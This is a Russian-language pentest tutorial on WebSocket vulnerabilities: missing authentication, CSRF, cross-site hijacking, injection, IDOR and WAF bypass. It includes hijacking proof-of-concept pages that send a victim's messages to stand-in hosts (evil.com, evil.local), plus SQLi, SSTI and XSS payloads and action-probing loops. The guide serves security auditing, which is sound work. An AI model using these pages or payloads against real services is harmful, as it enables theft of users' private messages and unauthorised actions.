WebSocket (WS) — это полноценный двунаправленный протокол поверх TCP, который браузеры открывают через `Upgrade: websocket`. В отличие от обычных HTTP-запросов, WS-соединение живёт долго, и приложение должно **само** реализовывать аутентификацию, авторизацию, валидацию сообщений и защиту от CSRF. Именно поэтому WebSocket — частый источник уязвимостей: разработчики переносят логику на WS, забывая про защиту, которая была у HTTP-эндпоинтов.

## Как работает рукопожатие

Соединение начинается с HTTP-запроса с заголовками:

```
GET /chat HTTP/1.1
Host: t
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://t
```

Сервер отвечает `101 Switching Protocols`. После этого данные идут фреймами.

Ключевые моменты для безопасности: **Origin** отправляется браузером (но подделывается вне браузера), **cookie** отправляются при рукопожатии (значит, WS подвержен CSRF), а **аутентификация** часто не реализована вовсе.

## Уязвимость 1: отсутствие аутентификации

Самая частая проблема — WS-эндпоинт принимает соединение без проверки сессии.

```bash
# подключаемся без cookie
websocat ws://t/ws
# если соединение открылось и принимает сообщения -> auth нет
```

Смотрим, какие сообщения принимает сервер и что отдаёт. Часто через WS доступны действия, которые через HTTP защищены.

## Уязвимость 2: CSRF через WebSocket

Браузер отправляет cookie при рукопожатии, и **WebSocket не подчиняется Same-Origin Policy** так же строго, как fetch. Если сервер не проверяет `Origin`, страница атакующего может открыть WS к цели с cookie жертвы.

```html
<script>
const ws = new WebSocket('wss://t/ws');
ws.onopen = () => ws.send(JSON.stringify({action:'deleteAccount'}));
</script>
```

Защита — проверка заголовка `Origin` на сервере при рукопожатии. Проверяйте, есть ли она.

```bash
# проверяем, отвергает ли сервер чужой Origin
websocat ws://t/ws -H='Origin: https://evil.com'
# если соединение открылось -> CSRF возможен
```

## Уязвимость 3: cross-site WebSocket hijacking

Если WS использует cookie-аутентификацию, не проверяет Origin и не использует CSRF-токен — атакующий может «украсть» соединение: открыть WS от имени жертвы и читать все сообщения.

```html
<script>
const ws = new WebSocket('wss://t/ws');
ws.onmessage = (e) => fetch('https://evil.com/?d='+encodeURIComponent(e.data));
ws.onopen = () => ws.send('{"action":"getMessages"}');
</script>
```

Артефакт — приватные сообщения жертвы на сервере атакующего.

## Уязвимость 4: инъекции в сообщениях

Данные из WS-сообщений часто идут в БД, в шаблоны, в команды. Проверяйте их так же, как HTTP-параметры: SQLi, NoSQLi, SSTI, command injection, path traversal.

```bash
# отправляем payload через websocat
websocat ws://t/ws <<< '{"action":"search","q":"1 AND SLEEP(5)-- -"}'
websocat ws://t/ws <<< '{"action":"render","tpl":"{{7*7}}"}'
```

## Уязвимость 5: отсутствие авторизации на сообщения

Сообщение может содержать `user_id`/`room_id`, и сервер не проверяет права. Это IDOR по WS.

```bash
# подписываемся на чужую комнату
websocat ws://t/ws <<< '{"action":"subscribe","room":"admin-room"}'
# получаем чужие сообщения
```

## Инструменты

```bash
# websocat — основной CLI-клиент
websocat ws://t/ws
websocat -H='Cookie: session=abc' ws://t/ws
websocat wss://t/ws --insecure
# читать из файла и слать построчно
websocat ws://t/ws < messages.txt
# через Burp (прокси)
websocat -H='X-Forwarded-For: 127.0.0.1' ws://t/ws

# Burp: Repeater поддерживает WebSocket-историю
# wscat (npm)
wscat -c wss://t/ws -H 'Cookie: session=abc'
```

| Инструмент | Назначение | Пример |
|-----------|-----------|--------|
| websocat | CLI-клиент WS | `websocat ws://t/ws` |
| wscat | Node-клиент | `wscat -c wss://t/ws` |
| Burp | перехват WS | WebSocket history |
| ZAP | фаззинг WS | WebSocket tab |

## Разобранный пример: cross-site hijacking

```bash
# 1. проверяем, что WS использует cookie и не проверяет Origin
$ websocat ws://t/ws -H='Cookie: session=abc' -H='Origin: https://evil.com'
# соединение открылось -> Origin не проверяется
< {"type":"welcome","user":"victim"}

# 2. строим эксплойт-страницу
cat > ws.html <<'HTML'
<script>
const ws = new WebSocket('wss://t/ws');
ws.onmessage = e => fetch('https://evil.local/?d='+encodeURIComponent(e.data));
ws.onopen = () => ws.send('{"action":"getPrivateData"}');
</script>
HTML

# 3. жертва открывает ws.html -> данные утекают
```

## Разобранный пример: IDOR в подписке

```bash
# 1. своя комната
$ websocat ws://t/ws -H='Cookie: session=abc' <<< '{"action":"subscribe","room":"user-57"}'
< {"type":"history","messages":[...]}

# 2. чужая комната
$ websocat ws://t/ws -H='Cookie: session=abc' <<< '{"action":"subscribe","room":"admin"}'
< {"type":"history","messages":[...]}   # чужие данные -> IDOR
```

## Крайние случаи и подводные камни

- **`Origin` подделывается вне браузера** — проверка Origin защищает только от браузерных атак, не от прямых клиентов.
- **Токены в URL** (`ws://t/ws?token=...`) утекают в логи и referrer.
- **`Sec-WebSocket-Protocol`** иногда используется для передачи токена — тоже утекает.
- **Прокси** может не поддерживать WS — используйте `wss` и проверяйте поведение.
- **Компрессия/фрагментация** фреймов может скрывать payload от WAF.
- **Rate-limiting** для WS часто отсутствует.

## Что делать дальше / решение

1. **Найдите WS-эндпоинты** в JS (`new WebSocket`) и в трафике.
2. **Проверьте аутентификацию** — работает ли соединение без cookie.
3. **Проверьте Origin** — отвергает ли сервер чужой origin.
4. **Проверьте авторизацию** — можно ли подписаться на чужие комнаты/данные.
5. **Проверьте инъекции** — прогоните payload'ы через сообщения.
6. **Соберите PoC** — страница cross-site hijacking или подписка на чужие данные.
7. **Тупик** — переходите к WebSocket smuggling/туннелированию.

| IDOR | чужой room/user_id | подписка на чужое |

## Почему WebSocket сложнее защищать

Обычные HTTP-эндпоинты получают защиту «бесплатно» от инфраструктуры: reverse proxy проверяет аутентификацию, WAF фильтрует запросы, фреймворк навязывает CSRF-токены и авторизацию по маршруту. WebSocket же после рукопожатия превращается в сырой поток фреймов, и всё это приходится реализовывать вручную. Middleware, который проверял HTTP-запросы, часто вообще не видит WS-сообщения. WAF, который фильтровал `?id=1'`, не разбирает JSON внутри WS-фрейма. Именно поэтому WS-логика остаётся без валидации и авторизации.

Второй фактор — асинхронность. HTTP-запрос можно представить как «запрос-ответ», и проверить права легко. WS — это долгоживущий канал, где клиент может отправить десятки разных «действий», и каждое требует отдельной проверки прав. Разработчики часто реализуют проверку только при подключении, а сами действия — нет. Это открывает IDOR и горизонтальное перемещение по данным.

Третий фактор — состояние. WS-соединение хранит состояние (подписки, комнаты, буферы), и ошибки в управлении этим состоянием приводят к утечкам: подписка на чужую комнату, доступ к чужому буферу, гонки между сообщениями.

## Взаимодействие с прокси и WAF

WS проходит через прокси, но многие прокси и WAF обрабатывают его хуже, чем HTTP. Это создаёт расхождения, которые можно эксплуатировать. Например, прокси проверяет `Origin` при рукопожатии, но backend — нет, или наоборот. WAF может не инспектировать содержимое фреймов, поэтому инъекции через WS проходят там, где HTTP-payload блокируется.

```bash
# проверяем, инспектирует ли WAF содержимое WS
websocat ws://t/ws <<< '{"q":"<script>alert(1)</script>"}'
# если payload дошёл до приложения -> WAF не смотрит внутрь WS

# проверяем расхождение Origin: через прокси vs напрямую
websocat wss://t/ws -H='Origin: https://evil.com'
```

Отдельно стоит проверить, поддерживает ли инфраструктура WS вообще: если нет, соединение может «проваливаться» в неожиданное поведение (например, прокси отдаёт HTML-ошибку), что само по себе информативно.

## Практика: полный аудит WebSocket

Системный аудит состоит из пяти шагов. Первый — **инвентаризация**: найдите все WS-эндпоинты в JS (`new WebSocket`, `socket.io`, `ws://`, `wss://`) и в трафике (Burp/ZAP). Второй — **рукопожатие**: проверьте, требует ли соединение аутентификации (попробуйте без cookie) и проверяет ли Origin. Третий — **протокол**: соберите список сообщений (действий), которые принимает сервер, — из JS-кода, из документации, из наблюдения за легитимным трафиком. Четвёртый — **тесты каждого действия**: на авторизацию (чужой id), на инъекции (SQLi/SSTI/NoSQLi), на бизнес-логику (отрицательные суммы, гонки). Пятый — **доказательство**: воспроизведите найденное минимальным клиентом (`websocat`) и, если это браузерная атака (CSRF/hijacking), соберите HTML-страницу.

```bash
# инвентаризация
katana -u https://t -jc -silent | grep -E '\.js' | sort -u | while read u; do
  curl -s "$u" | grep -oE "(ws|wss)://[^\"']+" ; done | sort -u
# перебор действий
for a in getMessages deleteAccount subscribe setRole getUsers; do
  echo "== $a"; websocat -t ws://t/ws -H='Cookie: session=abc' <<< "{\"action\":\"$a\"}"; done
```

Каждый шаг фиксируется командой и результатом. Это и PoC, и защита от повторной работы.

## Итог и приоритизация

Наиболее критичны cross-site WebSocket hijacking (кража данных через браузер жертвы) и отсутствие авторизации на действиях (IDOR). Отсутствие проверки Origin — усиливает первую. Инъекции через WS-сообщения оцениваются так же, как HTTP-инъекции. Токены в URL — утечка секрета. Помните: WS — это не «просто ещё один HTTP», а отдельный протокол со своей моделью угроз, и защищать его нужно явно.

## Частые ошибки при аудите WebSocket

Новички проверяют только рукопожатие и делают вывод «WS защищён», не заглядывая внутрь сообщений. Это ошибка: основная поверхность атаки — именно сообщения (действия), а не соединение. Вторая ошибка — тестировать WS только из браузера: браузер накладывает ограничения (Origin, cookie), а прямой клиент (`websocat`) позволяет обойти их и проверить серверную логику в чистом виде. Третья — забывать про CSRF: если соединение использует cookie и не проверяет Origin, страница атакующего откроет WS от имени жертвы. Четвёртая — не проверять авторизацию на каждом действии, а только на подключении. Пятая — игнорировать инъекции: данные из WS идут в те же sink'и (БД, шаблоны, команды), что и HTTP-параметры. Держите эти пять пунктов в голове — и WS перестанет быть «слепой зоной».
